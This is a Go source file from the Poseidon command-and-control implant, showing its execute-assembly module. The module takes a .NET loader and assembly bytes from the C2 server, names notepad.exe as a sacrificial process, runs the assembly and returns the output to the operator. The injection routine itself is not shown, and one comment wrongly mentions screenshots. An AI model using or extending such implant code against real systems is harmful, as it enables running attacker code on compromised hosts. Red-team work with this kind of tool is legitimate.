package executeassembly

import (
	"encoding/json"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var loaderAssembly []byte
var sacrificialProcess string = "notepad.exe"
var zeroPtr uintptr = uintptr(0)

type AssemblyOutput struct {
	StdOut string `json:"stdout"`
	StdErr string `json:"stderr"`
}

type Arguments struct {
	// The file ID on the server to retrieve the .NET loader
	LoaderFileID   string `json:"loader_id"`
	LoaderBytes    []byte `json:"loader_bytes"`
	AssemblyFileID string `json:"assembly_id"`
	AssemblyBytes  []byte `json:"assembly_bytes"`
	Arguments      string `json:"arguments"`
}

//Run - function used to obtain screenshots
func Run(args *Arguments, tMsg *structs.ThreadMsg, threadChannel chan<- structs.ThreadMsg) {
	if len(loaderAssembly) == 0 {
		if len(args.LoaderBytes) == 0 {
			tMsg.Error = true
			tMsg.TaskResult = []byte("Could not get .NET Loader DLL bytes.")
			threadChannel <- *tMsg
			return
		}
		loaderAssembly = args.LoaderBytes
	}

	result, err := executeassembly(&args.AssemblyBytes, &args.Arguments)

	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- *tMsg
		return
	}

	resultJson, err := json.Marshal(result)

	tMsg.TaskResult = []byte(resultJson)
	tMsg.Error = false
	threadChannel <- *tMsg
}